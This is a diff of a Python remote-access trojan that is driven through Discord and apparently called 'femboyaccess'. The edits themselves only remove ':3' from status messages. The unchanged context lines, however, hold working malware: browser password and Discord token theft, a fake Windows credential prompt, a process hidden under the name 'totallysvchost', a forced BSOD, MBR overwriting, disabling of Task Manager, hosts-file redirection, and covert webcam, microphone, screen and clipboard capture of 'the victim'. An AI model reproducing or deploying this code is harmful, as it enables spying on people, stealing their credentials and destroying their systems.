@@ -187,7 +187,7 @@ async def start_screen_streaming(message, duration):
 			frame = numpy.array(img)
 			frames.append(frame)
 		imageio.mimsave(output_file, frames, fps=fps, quality=8)
-		await message.channel.send(await femboyaccess("streamscreen", "finished recording! :3"), file=discord.File(output_file))
+		await message.channel.send(await femboyaccess("streamscreen", "finished recording! "), file=discord.File(output_file))
 		subprocess.run(f'del {output_file}', shell=True)
 	except Exception as e:
 		print(e)
@@ -212,7 +212,7 @@ async def msgbox(ctx, *, args):
 	params = args.split('"')
 	message = params[1].strip() if len(params) >= 2 else ""
 	title = params[3].strip() if len(params) >= 4 else ""
-	await ctx.reply(await femboyaccess("msgbox", f"successfully sent the message box! :3"))
+	await ctx.reply(await femboyaccess("msgbox", f"successfully sent the message box! "))
 	await asyncio.sleep(0.2)
 	ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)  # MB_OK | MB_ICONINFORMATION
 
@@ -262,7 +262,7 @@ key_frequencies = {
 }
 
 async def create_piano_embed(message):
-	piano_embed = discord.Embed(title=f"femboyaccess - piano >w< {version}", description="click a key to play the according sound! :3")
+	piano_embed = discord.Embed(title=f"femboyaccess - piano >w< {version}", description="click a key to play the according sound! ")
 	for key in key_frequencies:
 		piano_embed.add_field(name=key, value='\u200b', inline=True)
 	return await message.reply(embed=piano_embed)
@@ -354,7 +354,7 @@ async def download_sus(message):
 				await message.reply(await femboyaccess("sus", f"error while downloading among us: {response.status} :c"))
 				return
 			await write_file(response, filename)
-	await message.reply(await femboyaccess("sus", "among us downloaded! :3"))
+	await message.reply(await femboyaccess("sus", "among us downloaded! "))
 	unzip_directory = os.path.splitext(filename)[0]
 	try:
 		patoolib.extract_archive(filename, outdir=unzip_directory)
@@ -362,11 +362,11 @@ async def download_sus(message):
 		await message.reply(await femboyaccess("sus", f"error while extracting among us: {str(e)} :c"))
 		return
 	os.remove(filename)
-	await message.reply(await femboyaccess("sus", "among us unzipped! :3"))
+	await message.reply(await femboyaccess("sus", "among us unzipped! "))
 	game_directory = os.path.join(unzip_directory, "Among.Us.v2023.6.13i")
 	game_executable = os.path.join(game_directory, "Among Us.exe")
 	ctypes.windll.shell32.ShellExecuteW(None, "open", game_executable, None, game_directory, 1)
-	await message.reply(await femboyaccess("sus", "among us started successfully! :3"))
+	await message.reply(await femboyaccess("sus", "among us started successfully! "))
 
 async def download(message, url: str, dest: str = "c:\\", download_percent = True) -> None:
 
@@ -500,12 +500,12 @@ async def on_ready():
 		if whnd != 0:
 		   try:
 			   ctypes.windll.user32.ShowWindow(whnd, 0)
-			   await channel.send(await femboyaccess("stealth", "python window has been hidden! :3"))
+			   await channel.send(await femboyaccess("stealth", "python window has been hidden! "))
 		   except:
 			   await channel.send(await femboyaccess("stealth", "could not hide the python window! :c"))
 		try:
 			ctypes.windll.kernel32.SetConsoleTitleW("totallysvchost")
-			await channel.send(await femboyaccess("stealth", "changed process name! :3"))
+			await channel.send(await femboyaccess("stealth", "changed process name! "))
 		except:
 			await channel.send(await femboyaccess("stealth", "failed to change process name! :c"))
 		#shutil.move(__file__, os.path.join(new_femboyaccess_dir, os.path.basename(__file__)))
@@ -606,7 +606,7 @@ async def on_message(message):
 		res = ctypes.c_ulong()
 		ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
 		if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
-			await message.reply(await femboyaccess("bsod", "bsod successful! :3"))
+			await message.reply(await femboyaccess("bsod", "bsod successful! "))
 		else:
 			await message.reply(await femboyaccess("bsod", "bsod failed! :c"))
 
@@ -634,19 +634,19 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		if not random_mouse_running:
 			random_mouse_running = True
 			asyncio.create_task(start_random_mouse_movements())
-			await message.reply(await femboyaccess("random mouse movements", "random mouse movements toggled on! :3"))
+			await message.reply(await femboyaccess("random mouse movements", "random mouse movements toggled on! "))
 		else:
 			random_mouse_running = False
-			await message.reply(await femboyaccess("random mouse movements", "random mouse movements toggled off! :3"))
+			await message.reply(await femboyaccess("random mouse movements", "random mouse movements toggled off! "))
 
 	if message.content.startswith("randomvolume"):
 		if not random_volume_control:
 			random_volume_control = True
 			asyncio.create_task(start_random_volume_control())
-			await message.reply(await femboyaccess("random volume control", "random volume control toggled on! :3"))
+			await message.reply(await femboyaccess("random volume control", "random volume control toggled on! "))
 		else:
 			random_volume_control = False
-			await message.reply(await femboyaccess("random volume control", "random volume control toggled off! :3"))
+			await message.reply(await femboyaccess("random volume control", "random volume control toggled off! "))
 
 	if message.content.startswith("getclipboard"):
 		output = os.popen("powershell Get-Clipboard").read()
@@ -664,7 +664,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 				is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 			return is_admin
 		if isAdmin():
-			await message.reply(await femboyaccess("escalate privileges", "you're already admin silly! :3"))
+			await message.reply(await femboyaccess("escalate privileges", "you're already admin silly! "))
 		else:
 			class disable_fsr():
 				disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
@@ -707,11 +707,11 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 
 	if message.content.startswith("whoami"):
 		value = await check_privileges()
-		await message.reply(await femboyaccess("whoami", f"currently running as: {value} :3"))
+		await message.reply(await femboyaccess("whoami", f"currently running as: {value} "))
 
 	if message.content.startswith("msgbox"):
 		await msgbox(message, args=message.content)
-		await message.reply(await femboyaccess("msgbox", f"the user saw your message! :3"))
+		await message.reply(await femboyaccess("msgbox", f"the user saw your message! "))
 
 	if message.content.startswith("background"):
 		if len(message.content.split(" ")) > 1:
@@ -725,7 +725,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			with open(file_path, "wb") as f:
 				f.write(response.content)
 			ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 3)
-			await message.reply(await femboyaccess("background", "new background successfully applied! :3"))
+			await message.reply(await femboyaccess("background", "new background successfully applied! "))
 		else:
 			await message.reply(await femboyaccess("background", "failed to apply new background! :c"))
 
@@ -735,7 +735,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			file_path = os.path.join(os.getenv("TEMP"), attachment.filename)
 			await attachment.save(file_path)
 			playsound(file_path.replace("\\", "/"))
-			await message.reply(await femboyaccess("playsound", "sound has been played! :3"))
+			await message.reply(await femboyaccess("playsound", "sound has been played! "))
 		else:
 			await message.reply(await femboyaccess('playsound', 'please attach a sound file as an argument! :3'))
 
@@ -756,23 +756,23 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 		if is_admin == True:
 			donkeyballs = windll.user32.BlockInput(True)
-			await message.reply(await femboyaccess("blockinput", "blocked inputs successfully! :3"))
+			await message.reply(await femboyaccess("blockinput", "blocked inputs successfully! "))
 		else:
-			await message.reply(await femboyaccess("blockinput", "admin rights are required for this command, silly :3"))
+			await message.reply(await femboyaccess("blockinput", "admin rights are required for this command, silly "))
 
 	if message.content.startswith("unblockinput"):
 		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 		if is_admin == True:
 			donkeyballs = windll.user32.BlockInput(False)
-			await message.reply(await femboyaccess("unblockinput", "unblocked inputs successfully! :3"))
+			await message.reply(await femboyaccess("unblockinput", "unblocked inputs successfully! "))
 		else:
-			await message.reply(await femboyaccess("unblockinput", "admin rights are required for this command, silly :3"))
+			await message.reply(await femboyaccess("unblockinput", "admin rights are required for this command, silly "))
 
 	if message.content.startswith("tts"):
 		speak = wincl.Dispatch("SAPI.SpVoice")
 		speak.Speak(message.content[4:])
 		comtypes.CoUninitialize()
-		await message.reply(await femboyaccess("tts", "text transmitted! :3"))
+		await message.reply(await femboyaccess("tts", "text transmitted! "))
 
 	if message.content.startswith("windowsphish"):
 		fem = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
@@ -785,24 +785,24 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		   return output
 
 		result = str(shell().stdout.decode('CP437'))
-		await message.reply(await femboyaccess("windowsphish", "text transmitted! :3"))
+		await message.reply(await femboyaccess("windowsphish", "text transmitted! "))
 		await message.reply(await femboyaccess("windowsphish", f"password used: {result}"))
 
 	if message.content.startswith("displayoff"):
 		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 		if is_admin == True:
 			user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, 2)
-			await message.reply(await femboyaccess("displayoff", "screen has been turned off! :3"))
+			await message.reply(await femboyaccess("displayoff", "screen has been turned off! "))
 		else:
-			await message.reply(await femboyaccess("displayoff", "admin rights are required for this command, silly :3"))
+			await message.reply(await femboyaccess("displayoff", "admin rights are required for this command, silly "))
 
 	if message.content.startswith("displayon"):
 		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 		if is_admin == True:
 			user32.SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, -1)
-			await message.reply(await femboyaccess("displayoff", "screen has been turned off! :3"))
+			await message.reply(await femboyaccess("displayoff", "screen has been turned off! "))
 		else:
-			await message.reply(await femboyaccess("displayoff", "admin rights are required for this command, silly :3"))
+			await message.reply(await femboyaccess("displayoff", "admin rights are required for this command, silly "))
 
 	if message.content.startswith("tokens"):
 		local = os.getenv('LOCALAPPDATA')
@@ -839,13 +839,13 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		try:
 			ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
 			ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
-			await message.reply(await femboyaccess("critproc", "femboyaccess is now a critical process! :3"))
+			await message.reply(await femboyaccess("critproc", "femboyaccess is now a critical process! "))
 		except:
 			await message.reply(await femboyaccess("critproc", "could not turn femboyaccess into a critical process! :c"))
 	if message.content.startswith("uncritproc"):
 		try:
 			ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
-			await message.reply(await femboyaccess("uncritproc", "femboyaccess is no longer a critical process! :3"))
+			await message.reply(await femboyaccess("uncritproc", "femboyaccess is no longer a critical process! "))
 		except:
 			await message.reply(await femboyaccess("uncritproc", "could not turn femboyaccess into a normal process! :c"))
 
@@ -864,10 +864,10 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			else:
 				return 0
 		duration = get_idle_duration()
-		await message.reply(await femboyaccess("idletime", f"user has been idle for {duration} seconds! :3"))
+		await message.reply(await femboyaccess("idletime", f"user has been idle for {duration} seconds! "))
 
 	if message.content.startswith("passwords"):
-		await message.reply(await femboyaccess("passwords", "stealing passwords from browsers.. :3"))
+		await message.reply(await femboyaccess("passwords", "stealing passwords from browsers.. "))
 		passwords = ""
 		try:
 			# chrome
@@ -941,17 +941,17 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			await message.reply(await femboyaccess("streamscreen", "usage: `streamscreen <duration>`"))
 
 	if message.content.startswith("askescalate"):
-		await message.reply(await femboyaccess("askescalate", "asking to escalate privileges :3"))
+		await message.reply(await femboyaccess("askescalate", "asking to escalate privileges "))
 		ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
 	if message.content.startswith("pid"):
 		pid = os.getpid()
-		await message.reply(await femboyaccess("pid", f"current pid is: {pid} :3"))
+		await message.reply(await femboyaccess("pid", f"current pid is: {pid} "))
 
 	if message.content.startswith("localtime"):
 		now = datetime.datetime.now()
 		current = now.strftime("%H:%M:%S")
-		await message.reply(await femboyaccess("localtime", f"user's local time is: {str(current).encode()} :3"))
+		await message.reply(await femboyaccess("localtime", f"user's local time is: {str(current).encode()} "))
 
 	if message.content.startswith("timeset"):
 		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -962,9 +962,9 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			hour = message.content.split(" ")[4]
 			minute = message.content.split(" ")[5]
 			set_system_time(int(year), int(month), int(day), int(hour), int(minute))
-			await message.reply(await femboyaccess("timeset", "successfully changed the date! :3"))
+			await message.reply(await femboyaccess("timeset", "successfully changed the date! "))
 		else:
-			await message.reply(await femboyaccess("timeset", "admin rights are required for this command, silly :3"))
+			await message.reply(await femboyaccess("timeset", "admin rights are required for this command, silly "))
 
 	if message.content.startswith("webcampic"):
 		webcam = cv2.VideoCapture(0, CAP_DSHOW)
@@ -978,7 +978,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
 			WriteFile(hDevice, AllocateReadBuffer(512), None)
 			CloseHandle(hDevice)
-			await message.reply(await femboyaccess("fuckmbr", "mbr overwritten successfully! :3"))
+			await message.reply(await femboyaccess("fuckmbr", "mbr overwritten successfully! "))
 		except:
 			await message.reply(await femboyaccess("fuckmbr", "an error occurred! you probably don't have admin permissions :c"))
 
@@ -988,7 +988,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		new_value = message.content.split("  ")[3]
 		regedit = change_registry_value(key_path, value_name, new_value)
 		if regedit == 1:
-			await message.reply(await femboyaccess("regedit", "edited successfully! :3"))
+			await message.reply(await femboyaccess("regedit", "edited successfully! "))
 		else:
 			await message.reply(await femboyaccess("regedit", "could not edit the value! :c"))
 
@@ -996,7 +996,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		try:
 			task = message.content.split(" ")[1]
 			subprocess.run(['taskkill', '/F', '/IM', task], check=True)
-			await message.reply(await femboyaccess("taskkill", "killed the process! :3"))
+			await message.reply(await femboyaccess("taskkill", "killed the process! "))
 		except:
 			await message.reply(await femboyaccess("taskkill", "could not kill the process! :c"))
 
@@ -1011,35 +1011,35 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 	if message.content.startswith("disabletaskmgr"):
 		try:
 			subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'])
-			await message.reply(await femboyaccess("disabletaskmgr", "task manager has been disabled! :3"))
+			await message.reply(await femboyaccess("disabletaskmgr", "task manager has been disabled! "))
 		except:
 			await message.reply(await femboyaccess("disabletaskmgr", "task manager could not be disabled, you probably aren't running as admin! :c"))
 
 	if message.content.startswith("enabletaskmgr"):
 		try:
 			subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'])
-			await message.reply(await femboyaccess("enabletaskmgr", "task manager has been enabled! :3"))
+			await message.reply(await femboyaccess("enabletaskmgr", "task manager has been enabled! "))
 		except:
 			await message.reply(await femboyaccess("enabletaskmgr", "task manager could not be enabled, you probably aren't running as admin! :c"))
 
 	if message.content.startswith("highbeep"):
 		duration = int(message.content.split(" ")[1])
-		await message.reply(await femboyaccess("highbeep", "high-pitched beep noise is currently playing! :3"))
+		await message.reply(await femboyaccess("highbeep", "high-pitched beep noise is currently playing! "))
 		winsound.Beep(32767, duration)
-		await message.reply(await femboyaccess("highbeep", "high-pitched beep noise finished! :3"))
+		await message.reply(await femboyaccess("highbeep", "high-pitched beep noise finished! "))
 
 	if message.content.startswith("lowbeep"):
 		duration = int(message.content.split(" ")[1])
-		await message.reply(await femboyaccess("lowbeep", "low-pitched beep is currently playing! :3"))
+		await message.reply(await femboyaccess("lowbeep", "low-pitched beep is currently playing! "))
 		winsound.Beep(37, duration)
-		await message.reply(await femboyaccess("lowbeep", "low-pitched beep noise finished! :3"))
+		await message.reply(await femboyaccess("lowbeep", "low-pitched beep noise finished! "))
 
 	if message.content.startswith("custombeep"):
 		frequency = int(message.content.split(" ")[1])
 		duration = int(message.content.split(" ")[2])
-		await message.reply(await femboyaccess("lowbeep", "low-pitched beep is currently playing! :3"))
+		await message.reply(await femboyaccess("lowbeep", "low-pitched beep is currently playing! "))
 		winsound.Beep(frequency, duration)
-		await message.reply(await femboyaccess("lowbeep", "low-pitched beep noise finished! :3"))
+		await message.reply(await femboyaccess("lowbeep", "low-pitched beep noise finished! "))
 
 	if message.content.startswith("piano"):
 		piano_message = await create_piano_embed(message)
@@ -1052,7 +1052,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		mode = message.content.split(" ")[1]
 		time = message.content.split(" ")[2]
 		if mode == "patinvert":
-			await message.reply(await femboyaccess("gdi", f"started the patinvert effect for {time}ms! :3"))
+			await message.reply(await femboyaccess("gdi", f"started the patinvert effect for {time}ms! "))
 			for i in range(0, 100):
 				brush = win32gui.CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
 				win32gui.SelectObject(desk, brush)
@@ -1060,9 +1060,9 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 				asyncio.sleep(int(time))
 			win32gui.ReleaseDC(desk, GetDesktopWindow())
 			win32gui.DeleteDC(desk)
-			await message.reply(await femboyaccess("gdi", f"stopped the patinvert effect! :3"))
+			await message.reply(await femboyaccess("gdi", f"stopped the patinvert effect! "))
 		elif mode == "patcopy":
-			await message.reply(await femboyaccess("gdi", f"started the patcopy effect for {time}ms! :3"))
+			await message.reply(await femboyaccess("gdi", f"started the patcopy effect for {time}ms! "))
 			for i in range(0, 100):
 				brush = win32gui.CreateSolidBrush(RGB(
 					random.randrange(255),
@@ -1074,9 +1074,9 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 				asyncio.sleep(int(time))
 			win32gui.ReleaseDC(desk, GetDesktopWindow())
 			win32gui.DeleteDC(desk)
-			await message.reply(await femboyaccess("gdi", f"stopped the patcopy effect! :3"))
+			await message.reply(await femboyaccess("gdi", f"stopped the patcopy effect! "))
 		elif mode == "srccopy":
-			await message.reply(await femboyaccess("gdi", f"started the srccopy effect for {time}ms! :3"))
+			await message.reply(await femboyaccess("gdi", f"started the srccopy effect for {time}ms! "))
 			for i in range(0, 100):
 				brush = win32gui.CreateSolidBrush(RGB(
 					random.randrange(255),
@@ -1088,7 +1088,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 				asyncio.sleep(int(time))
 			win32gui.ReleaseDC(desk, GetDesktopWindow())
 			win32gui.DeleteDC(desk)
-			await message.reply(await femboyaccess("gdi", f"stopped the srccopy effect! :3"))
+			await message.reply(await femboyaccess("gdi", f"stopped the srccopy effect! "))
 
 	if message.content.startswith("opencd"):
 		winmm = ctypes.windll.winmm
@@ -1099,7 +1099,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		mci_open_parms = ctypes.create_unicode_buffer(128)
 		mci_open_parms.value = "cdaudio"
 		winmm.mciSendStringW("open " + mci_open_parms.value + " type cdaudio alias drive", None, 0, None)
-		await message.reply(await femboyaccess("opencd", "opened the cd tray! :3"))
+		await message.reply(await femboyaccess("opencd", "opened the cd tray! "))
 
 	if message.content.startswith("closecd"):
 		winmm = ctypes.windll.winmm
@@ -1108,36 +1108,36 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		MCI_SET_DOOR_OPEN = 0x0843
 		MCI_SET_DOOR_CLOSED = 0x0844
 		winmm.mciSendStringW("set drive door closed", None, 0, None)
-		await message.reply(await femboyaccess("closecd", "closed the cd tray! :3"))
+		await message.reply(await femboyaccess("closecd", "closed the cd tray! "))
 
 	if message.content.startswith("spamtext"):
 		if not spamtext:
 			spamtext = True
 			asyncio.create_task(print_on_screen(ctx=message, args=message.content))
-			await message.reply(await femboyaccess("spamtext", "spamming text on screen! :3"))
+			await message.reply(await femboyaccess("spamtext", "spamming text on screen! "))
 		else:
 			spamtext = False
-			await message.reply(await femboyaccess("spamtext", "no longer spamming text on screen! :3"))
+			await message.reply(await femboyaccess("spamtext", "no longer spamming text on screen! "))
 
 	if message.content.startswith("sus"):
 		asyncio.create_task(download_sus(message))
-		await message.reply(await femboyaccess("sus", "downloading among us.. :3"))
+		await message.reply(await femboyaccess("sus", "downloading among us.. "))
 
 	if message.content.startswith("shutdown"):
-		await message.reply(await femboyaccess("shutdown", "initiating computer shutdown! :3"))
+		await message.reply(await femboyaccess("shutdown", "initiating computer shutdown! "))
 		os.system("shutdown /s /t 0")
 
 	if message.content.startswith("restart"):
 		mode = message.content.split(" ")[1]
 		if mode == "normal":
-			await message.reply(await femboyaccess("restart", "initiating normal computer restart! :3"))
+			await message.reply(await femboyaccess("restart", "initiating normal computer restart! "))
 			os.system("shutdown /r /t 0")
 		elif mode == "safemode":
-			await message.reply(await femboyaccess("restart", "initiating safe mode computer restart! :3"))
+			await message.reply(await femboyaccess("restart", "initiating safe mode computer restart! "))
 			subprocess.run("bcdedit /set {current} safeboot minimal", shell=True)
 			os.system("shutdown /r /t 0")
 		elif mode == "safenetwork":
-			await message.reply(await femboyaccess("restart", "initiating safe mode with networking computer restart! :3"))
+			await message.reply(await femboyaccess("restart", "initiating safe mode with networking computer restart! "))
 			subprocess.run("bcdedit /set {current} safeboot network", shell=True)
 			os.system("shutdown /r /t 0")
 		else:
@@ -1150,7 +1150,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		i = 0
 		while 1:
 			if i == 0:
-				await message.reply(await femboyaccess("recordcamera", "started recording! :3"))
+				await message.reply(await femboyaccess("recordcamera", "started recording! "))
 			ret, frame = cap.read()     
 			output.write(frame)         
 			i=1
@@ -1160,7 +1160,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 				pass
 			else:
 				if msgg.content == "stop":       
-					await message.reply(await femboyaccess("recordcamera", "stopped recording, sending file! :3"))
+					await message.reply(await femboyaccess("recordcamera", "stopped recording, sending file! "))
 					break
 
 		cap.release()       
@@ -1178,29 +1178,29 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 #       try:
 #           subprocess.run(["echo", f"{code_to_inject} >> C:/Users/waw/AppData/Local/Discord/app-1.0.9016/resources/app.asar/index.js"], shell=True, check=True)
 #           subprocess.run(["killall", "-HUP", "Discord"], shell=True, check=True)
-#           await message.reply(await femboyaccess("discordinject", "code injected successfully! :3"))
+#           await message.reply(await femboyaccess("discordinject", "code injected successfully! "))
 #       except subprocess.CalledProcessError as e:
 #           await message.reply(await femboyaccess("discordinject", "code not injected! :c"))
 
 	if message.content.startswith("question"):
 		msg = message.content.split('"')[1]
-		await message.reply(await femboyaccess("question", "sent the question! :3"))
+		await message.reply(await femboyaccess("question", "sent the question! "))
 		root = tkinter.Tk()
 		root.wm_attributes("-topmost", 1)
 		root.withdraw()
 		response = tkinter.messagebox.askyesno("question", msg, parent=root)
 		if response:
-			await message.reply(await femboyaccess("question", "user said yes! :3"))
+			await message.reply(await femboyaccess("question", "user said yes! "))
 			root.destroy()
 		else:
-			await message.reply(await femboyaccess("question", "user said no! :3"))
+			await message.reply(await femboyaccess("question", "user said no! "))
 			root.destroy()
 
 	if message.content.startswith("hidetaskbar"):
 		try:
 			tsk = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
 			ctypes.windll.user32.ShowWindow(tsk, 0)
-			await message.reply(await femboyaccess("hidetaskbar", "taskbar hidden! :3"))
+			await message.reply(await femboyaccess("hidetaskbar", "taskbar hidden! "))
 		except:
 			await message.reply(await femboyaccess("hidetaskbar", "could not hide taskbar! :c"))
 
@@ -1208,7 +1208,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		try:
 			tsk = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
 			ctypes.windll.user32.ShowWindow(tsk, 9)
-			await message.reply(await femboyaccess("showtaskbar", "taskbar shown! :3"))
+			await message.reply(await femboyaccess("showtaskbar", "taskbar shown! "))
 		except:
 			await message.reply(await femboyaccess("showtaskbar", "could not show taskbar! :c"))
 
@@ -1224,7 +1224,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			try:
 				redirection_ip = socket.gethostbyname(redirection_link)
 			except socket.gaierror:
-				return await message.reply(await femboyaccess("webredirect", "invalid redirection link. please provide an ip address or a resolvable domain name! :3"))
+				return await message.reply(await femboyaccess("webredirect", "invalid redirection link. please provide an ip address or a resolvable domain name! "))
 		websites = arguments[1:]
 		hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
 		try:
@@ -1239,7 +1239,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 							hosts_file.write(f"\n{redirection_ip} www.{website}\n")
 						hosts_file.write(f"\n{redirection_ip} {website}\n")
 			os.system("ipconfig /flushdns")
-			await message.reply(await femboyaccess("webredirect", "listed websites will now be redirected! :3"))
+			await message.reply(await femboyaccess("webredirect", "listed websites will now be redirected! "))
 		except Exception as e:
 			await message.reply(await femboyaccess("webredirect", f"could not redirect listed website! :c\nerror: {str(e)}"))
 
@@ -1251,7 +1251,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			try:
 				with open(file_path, 'w') as file:
 					file.write("0")
-				await message.reply(await femboyaccess("desktopflood", "flooded the desktop! :3"))
+				await message.reply(await femboyaccess("desktopflood", "flooded the desktop! "))
 			except Exception as e:
 				await message.reply(await femboyaccess("desktopflood", "could not flood the desktop! :c"))
 
@@ -1265,7 +1265,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		directory = message.content.split(" ")[1]
 		try:
 			os.mkdir(directory)
-			await message.reply(await femboyaccess("mkdir", f"successfully created directory: {directory}! :3"))
+			await message.reply(await femboyaccess("mkdir", f"successfully created directory: {directory}! "))
 		except Exception as e:
 			await message.reply(await femboyaccess("mkdir", f"failed to create directory: {directory}! :c\n{e}"))
 
@@ -1279,7 +1279,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			else:
 				await message.reply(await femboyaccess("rm", f"file or directory not found: {file_or_directory}! :c"))
 				return
-			await message.reply(await femboyaccess("rm", f"successfully removed: {file_or_directory}! :3"))
+			await message.reply(await femboyaccess("rm", f"successfully removed: {file_or_directory}! "))
 		except Exception as e:
 			await message.reply(await femboyaccess("rm", f"failed to remove: {file_or_directory}! :c\n{e}"))
 
@@ -1287,7 +1287,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		permissions, file_or_directory = message.content.split(" ")[1:]
 		try:
 			os.chmod(file_or_directory, int(permissions, 8))
-			await message.reply(await femboyaccess("chmod", f"successfully changed permissions of {file_or_directory} to {permissions}! :3"))
+			await message.reply(await femboyaccess("chmod", f"successfully changed permissions of {file_or_directory} to {permissions}! "))
 		except Exception as e:
 			await message.reply(await femboyaccess("chmod", f"failed to change permissions of {file_or_directory}! :c\n{e}"))
 
@@ -1296,7 +1296,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 		vc_list_message = "select a voice channel to join:\n"
 		for i, channel_name in enumerate(voice_channels, start=1):
 			vc_list_message += f"{i}. {channel_name}\n"
-		vc_list_message += "react with the corresponding number to join the voice channel! :3"
+		vc_list_message += "react with the corresponding number to join the voice channel! "
 		vc_list = await message.channel.send(vc_list_message)
 		for i in range(1, min(10, len(voice_channels) + 1)):
 			await vc_list.add_reaction(f"{i}\u20e3")
@@ -1313,7 +1313,7 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 			selected_channel = message.guild.voice_channels[selected_channel_index]
 			vc = await selected_channel.connect(self_deaf=True)
 			vc.play(PyAudioPCM())
-			await message.reply(await femboyaccess("instantmic", f"joined the voice channel '{selected_channel.name}' and currently streaming microphone in realtime! :3"))
+			await message.reply(await femboyaccess("instantmic", f"joined the voice channel '{selected_channel.name}' and currently streaming microphone in realtime! "))
 			bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
 			opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
 			discord.opus.load_opus(opuslib_path)
@@ -1343,11 +1343,11 @@ screenshot taken! see attachment :3[0m[2;35m[0m```""", file=file)
 	elif message.content.startswith("injectclipboard"):
 		text = message.content.split(" ")[1]
 		pyperclip.copy(text)
-		await message.reply(await femboyaccess("injectclipboard", "successfully injected your text to the victim's clipboard! :3"))
+		await message.reply(await femboyaccess("injectclipboard", "successfully injected your text to the victim's clipboard! "))
 
 @client.event
 async def on_disconnect():
-	await channel.send(await femboyaccess("disconnected", "this session is disconnected (unusable)! :3"))
+	await channel.send(await femboyaccess("disconnected", "this session is disconnected (unusable)! "))
 	await channel.delete()
 	await client.close()
 
